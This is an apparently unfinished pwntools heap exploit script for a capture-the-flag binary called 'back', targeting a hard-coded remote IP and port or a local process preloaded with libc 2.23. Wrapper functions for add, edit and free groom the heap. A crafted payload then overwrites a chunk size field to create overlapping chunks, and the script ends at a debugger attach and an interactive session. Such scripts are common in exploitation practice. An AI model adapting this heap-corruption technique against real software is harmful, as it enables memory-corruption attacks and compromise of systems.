from pwn import *
import sys

HOST = '69.172.229.147'
PORT = 9003
LIBC = ELF("./libc-2.23.so",checksec = False)

if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./back',env = {"LD_PRELOAD" : "./libc-2.23.so"})

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

def add(idx,size,data):
    sla('> ','1')
    sla('index: ',str(idx))
    sla('size: ',str(size))
    sla('data: ',data)

def edit(idx,size,data=""):
    sla('> ','2')
    sla('index: ',str(idx))
    sla('size: ',str(size))
    if(size!=0):
        sla('data: ',data)
    else:
        return

def free(idx):
    sla('> ','3')
    sla('index: ',str(idx))

if __name__=="__main__":
    add(0,0x48,"a"*0x46)
    add(1,0x68,"a"*0x66)
    free(0)
    free(1)
    add(0,0x58,"a"*0x56)
    add(1,0x58,"a"*0x56)
    free(0)
    free(1)
    add(0,0x48,"1"*0x46)
    add(1,0x68,"2"*0x66)
    payload=p64(0)+"a"*0x38+ p64(0)+p64(0xd1)
    edit(1,0)
    edit(0,0x58,payload)
    free(1)
    add(1,0x48,"0"*0x46)
    payload = p64(0) + "a"*0x38 +p64(0) +p64(0x71)
   # edit(1,0x58,payload)
    gdb.attach(io)
    io.interactive()
